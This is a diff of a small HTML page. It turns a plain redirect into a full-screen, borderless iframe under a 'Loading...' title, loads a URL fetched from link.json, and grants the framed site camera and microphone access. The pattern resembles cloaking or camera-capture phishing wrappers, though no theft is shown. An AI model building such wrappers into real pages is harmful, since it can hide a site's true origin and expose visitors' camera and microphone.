@@ -1,22 +1,31 @@
-<!DOCTYPE html>
-<html>
+<!DOCTYPE html><html>
 <head>
-<title>Redirecting...</title>
-</head>
+<title>Loading...</title><style>
+html,body{
+margin:0;
+padding:0;
+height:100%;
+width:100%;
+background:black;
+}
 
-<body>
-
-<script>
+#iframe{
+border:none;
+width:100%;
+height:100%;
+}
+</style></head><body><iframe id="iframe"
+allow="camera; microphone; fullscreen"
+allowfullscreen>
+</iframe><script>
 
 fetch("link.json?t=" + Date.now())
 .then(response => response.json())
 .then(data => {
-window.location.href = data.url;
+
+document.getElementById("iframe").src = data.url;
+
 });
 
-</script>
-
-Please Wait few minutes.....
-
-</body>
+</script></body>
 </html>
